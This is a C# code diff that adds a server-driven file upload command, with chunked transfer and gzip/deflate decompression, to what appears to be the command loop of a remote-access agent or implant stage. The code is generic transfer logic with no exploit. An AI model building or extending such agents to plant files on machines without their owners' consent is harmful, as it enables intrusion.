@@ -89,6 +89,11 @@ namespace Reno.Stages
                             DeleteFileSystemObject(header, fileSystemObject);
                             break;
                         case CommChannel.UPLOAD:
+                            byte[] fileToUpload = channel.Decompress(channel.ReceiveBytes(header.DataLength));
+                            string fileUpload = GetFullPath(Encoding.UTF8.GetString(fileToUpload));
+                            Console.WriteLine("[*] File upload requested for {0}", fileUpload);
+                            CommHeader fileHeader = channel.ReceiveHeader();
+                            UploadFile(fileHeader, fileUpload);
                             break;
                         case CommChannel.DOWNLOAD:
                             byte[] fileToDownload = channel.Decompress(channel.ReceiveBytes(header.DataLength));
@@ -113,6 +118,120 @@ namespace Reno.Stages
                 {
                     Console.WriteLine("[-] Unknown error in main terminal loop - {0}", e.Message);
                     run = false;
+                }
+            }
+        }
+        /// <summary>
+        /// This is a helper function to receives a file uploaded from the server.
+        /// This function does things differently than the others when it comes to compression.
+        /// If the CommChannel is compression, the function receives the fully compressed file 
+        /// fomr the server and then decompresses it.
+        /// </summary>
+        /// <param name="header">CommHeader that was sent from the server</param>
+        /// <param name="file">File to receive</param>
+        private void UploadFile(CommHeader header, string file)
+        {
+            if (header.Compression == CommChannel.NONE)
+            {
+                // Receive the uncompressed file
+                try
+                {
+                    using (FileStream fs = new FileStream(GetFullPath(file), FileMode.Create))
+                    {
+                        long received = 0;
+                        long size = header.DataLength;
+                        while(received < size)
+                        {
+                            if(size - received < CommChannel.CHUNK_SIZE)
+                            {
+                                fs.Seek(received, SeekOrigin.Begin);
+                                byte[] b = channel.ReceiveBytes((int)(size - received));
+                                fs.Write(b, 0, (int)(size - received));
+                                received += (size - received);
+                            }
+                            else
+                            {
+                                fs.Seek(received, SeekOrigin.Begin);
+                                byte[] b = channel.ReceiveBytes(CommChannel.CHUNK_SIZE);
+                                fs.Write(b, 0, CommChannel.CHUNK_SIZE);
+                                received += CommChannel.CHUNK_SIZE;
+                            }
+                        }
+                    }
+                }
+                catch(IOException ioex)
+                {
+                    Console.WriteLine("[-] Error receiving the file: {0}", ioex.Message);
+                }
+                catch (Exception e)
+                {
+                    Console.WriteLine("[-] Unknown error receiving the file: {0}", e.Message);
+                }
+            }
+            else
+            {
+                try
+                {
+                    // Create the tmp file
+                    using (FileStream tmpStream = new FileStream("tmp", FileMode.Create))
+                    {
+                        long received = 0;
+                        long size = header.DataLength;
+                        while (received < size)
+                        {
+                            if (size - received < CommChannel.CHUNK_SIZE)
+                            {
+                                tmpStream.Seek(received, SeekOrigin.Begin);
+                                byte[] b = channel.ReceiveBytes((int)(size - received));
+                                tmpStream.Write(b, 0, (int)(size - received));
+                                received += (size - received);
+                            }
+                            else
+                            {
+                                tmpStream.Seek(received, SeekOrigin.Begin);
+                                byte[] b = channel.ReceiveBytes(CommChannel.CHUNK_SIZE);
+                                tmpStream.Write(b, 0, CommChannel.CHUNK_SIZE);
+                                received += CommChannel.CHUNK_SIZE;
+                            }
+                        }
+                    }
+
+                    // Decompress the file
+                    using (FileStream tmpStream = new FileStream("tmp", FileMode.Open))
+                    {
+                        if (header.Compression == CommChannel.GZIP)
+                        {
+                            using (FileStream fs = new FileStream(GetFullPath(file), FileMode.Create))
+                            {
+                                using (GZipStream gzip = new GZipStream(tmpStream, CompressionMode.Decompress))
+                                {
+                                    gzip.CopyTo(fs);
+                                }
+                            }
+                        }
+                        else if (header.Compression == CommChannel.DEFLATE)
+                        {
+                            using (FileStream fs = new FileStream(GetFullPath(file), FileMode.Create))
+                            {
+                                using (DeflateStream deflate = new DeflateStream(tmpStream, CompressionMode.Decompress))
+                                {
+                                    deflate.CopyTo(fs);
+                                }
+                            }
+                        }
+                    }
+                    // Delete the tmp file
+                    FileInfo tmp = new FileInfo("tmp");
+                    if (tmp.Exists)
+                        tmp.Delete();
+                }
+                catch (IOException ioex)
+                {
+                    Console.WriteLine("[-] Error receiving the compressed file: {0}", ioex.Message);
+                }
+                catch (Exception e)
+                {
+                    Console.WriteLine("[-] Unknown error receiving the compressed file: {0}", e.Message);
                 }
             }
         }
